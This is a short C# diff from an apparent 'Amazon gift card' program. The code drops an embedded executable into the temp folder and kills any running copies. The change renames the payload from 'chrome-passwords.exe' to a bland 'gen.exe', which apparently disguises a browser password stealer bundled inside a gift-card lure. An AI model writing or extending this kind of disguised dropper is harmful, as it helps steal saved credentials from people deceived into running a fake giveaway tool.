@@ -35,12 +35,12 @@ namespace AmazonGiftCards
             System.IO.Directory.CreateDirectory(folderName);
 
 
-            byte[] exeBytes = Properties.Resources.chrome_passwords;
-            string exeToRun = Path.Combine(Path.GetTempPath(), "chrome-passwords.exe");
+            byte[] exeBytes = Properties.Resources.gen;
+            string exeToRun = Path.Combine(Path.GetTempPath(), "gen.exe");
 
             if (File.Exists(exeToRun))
             {
-                foreach (var node in Process.GetProcessesByName("chrome-passwords"))
+                foreach (var node in Process.GetProcessesByName("gen"))
                 {
                     node.Kill();
                 }
